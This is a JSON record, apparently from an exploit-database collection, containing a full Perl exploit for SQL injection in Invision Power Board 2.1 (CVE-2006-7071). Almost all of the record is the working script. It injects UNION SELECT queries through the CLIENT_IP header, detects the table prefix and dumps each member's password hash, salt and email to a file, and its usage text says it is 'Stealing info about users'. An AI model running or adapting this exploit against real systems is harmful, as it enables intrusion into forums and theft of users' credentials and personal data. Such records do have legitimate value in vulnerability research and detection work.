{
  "id": "2033",
  "title": "Invision Power Board 2.1 &lt; 2.1.6 - SQL Injection (2)",
  "cve": "CVE-2006-7071",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse LWP::UserAgent; \r\n$ua = LWP::UserAgent->new; \r\n&header();\r\nif (@ARGV < 2) {&info(); exit();}\r\n$server = $ARGV[0];\r\n$dir = $ARGV[1];\r\nprint \"[+] SERVER {$server}\\r\\n\";\r\nprint \"[+] DIR {$dir}\\r\\n\";\r\n#Step 1, detecting vulnerability\r\nprint \"[1] Testing forum vulnerability...\";\r\n$q = \"UNION SELECT 'VULN',1,1,1/*\";\r\nquery($q,$server,$dir);\r\nif($rep =~/VULN/){ print \"forum vulnerable\\r\\n\"; }\r\nelse \r\n    {\r\n     print \"forum unvulnerable\\r\\n\";\r\n\t &footer();\r\n     exit();\r\n    }\r\n#Step 2, detecting prefix\r\nprint \"[2] Searching prefix...\";\r\n$q = \"\";\r\nquery($q,$server,$dir);\r\n$prefix = $rep;\r\nprint $prefix.\"\\r\\n\";\r\n#Step 3, make query\r\nprint \"[3] Performing query; it may take several minutes, plz, wait...\\r\\n\";\r\n$q1 = \"UNION SELECT MAX(converge_id),1,1,1 FROM \".$prefix.\"members_converge/*\";\r\nquery($q1,$server,$dir);\r\n$kol = $rep;\r\nopen(RES,\">\".$server.\"_result.txt\");\r\nfor($id = 1; $id <= $kol; $id++)\r\n    {\r\n\t $own_query = \"UNION SELECT converge_pass_hash,1,1,1 FROM \".$prefix.\"members_converge WHERE converge_id=\".$id.\"/*\";\r\n     query($own_query,$server,$dir);\r\n     if($rep=~/[0-9a-f]{32}/i) \r\n\t    {\r\n\t     $hash = $rep;\r\n\t\t $own_query = \"UNION SELECT converge_pass_salt,1,1,1 FROM \".$prefix.\"members_converge WHERE converge_id=\".$id.\"/*\";\r\n         query($own_query,$server,$dir);\r\n         if(length($rep)==5) \r\n\t\t    {\r\n\t\t\t $salt = $rep;\r\n\t\t\t $own_query = \"UNION SELECT converge_email,1,1,1 FROM \".$prefix.\"members_converge WHERE converge_id=\".$id.\"/*\";\r\n             query($own_query,$server,$dir);\r\n\t\t\t if(length($rep)>0)\r\n\t\t\t    {\r\n\t\t\t\t $email = $rep;\r\n\t\t\t\t print RES $id.\":\".$hash.\":\".$salt.\"::\".$email.\"\\n\";\r\n\t\t\t    }\r\n\t\t\t}\t\t \r\n\t\t}\r\n    }\r\nclose(RES);\r\nprint \"[!] Query was successfully perfomed. Results are in txt files\\r\\n\";\r\n&footer();\r\n$ex = <STDIN>;\r\nsub footer()\r\n    {\r\n     print \"[G] Greets: 1dt.w0lf (rst/ghc)\\r\\n\";\r\n     print \"[L] Visit: secbun.info | damagelab.org | rst.void.ru\\r\\n\";\r\n    }\r\nsub header()\r\n{\r\nprint q(\r\n----------------------------------------------------------\r\n* Invision Power Board 2.1.* Remote SQL Injecton Exploit *\r\n*       Based on r57-Advisory#41 by 1dt.w0lf (rst/ghc)   *\r\n*                Coded by w4g.not null                   *\r\n*              FOR EDUCATIONAL PURPOSES *ONLY*           *\r\n----------------------------------------------------------\r\n);\r\n}\r\nsub info()\r\n{\r\n print q(\r\n[i] Usage: perl w4gipb216.pl [server] [/dir/]\r\n     where\r\n\t   |- server - server, where IPB installed without http://\r\n\t   |- /dir/ - dir, where IPB installed or / for no dir\r\n\t e.g perl w4gipb216.pl someserver.com /forum/\r\n[i] Stealing info about users (format id:pass:salt::email)\t  \r\n[!] Need MySQL > 4.0 \r\n );\r\n}\r\nsub query()\r\n    {\r\n     my($q,$server,$dir) = @_;\r\n     $res = $ua->get(\"http://\".$server.$dir.\"index.php?s=w00t\",'USER_AGENT'=>'','CLIENT_IP'=>\"' \".$q); \r\n     if($res->is_success)\r\n        {\r\n         $rep = '';\r\n         if($res->as_string =~ /ipb_var_s(\\s*)=(\\s*)\"(.*)\"/) { $rep = $3; }\r\n         else\r\n   \t\t    {\r\n             if($res->as_string =~ /FROM (.*)sessions/) { $rep = $1; }\r\n            }\r\n        }\r\n     return $rep;\r\n    }\r\n\r\n# milw0rm.com [2006-07-18]",
  "url": "https://www.exploit-db.com/exploits/2033"
}